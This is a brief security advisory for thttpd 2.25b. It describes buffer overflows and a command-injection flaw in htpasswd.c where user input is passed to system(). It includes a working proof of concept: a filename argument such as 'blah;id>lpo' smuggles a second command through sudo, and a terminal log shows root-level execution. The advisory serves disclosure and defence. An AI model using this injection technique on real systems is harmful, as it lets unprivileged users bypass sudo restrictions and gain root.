   Description: thttpd is a simple, small, portable, fast, and secure HTTP
   server.
   Vulnerability:
   thttpd-2.25b** - Two buffer overflows and command execution in
   htpasswd.c. htpasswd is not installed setuid root, however in some user
   installations htpasswd might be executed via sudo. Exploting the above
   vulnerabilities would allow a non-priveledged user to circumvent sudo
   acls for example. <code c> line 189 strcpy(user,argv[2]); line 197
   strcpy(l,line); line 215&216: sprintf(command,"cp %s
   %s",temp_template,argv[1]); system(command); </code> If perhaps sudo is
   being used to limit what commands a user can execute as www, you could
   run other commands like so: sudo -u www /bin/htpasswd -c "blah;id>lpo"
   webauth sudo -u www /bin/htpasswd "blah;id>lpo" webauth'' larry@mog:~$
   sudo /bin/htpasswd -c "blh;id>lp" www larry@mog:~$ sudo /bin/htpasswd
   "blh;id>lp" www'' Changing password for user www New password: Re-type
   new password: larry@mog:~$ cat lp uid=0(root) gid=0(root)
   groups=0(root) larry@mog:~$ sudo id We trust you have received the
   usual lecture from the local System Administrator. It usually boils
   down to these three things: #1) Respect the privacy of others. #2)
   Think before you type. #3) With great power comes great responsibility.
   Password Sorry, user larry is not allowed to execute '/usr/bin/id' as
   root on mog.
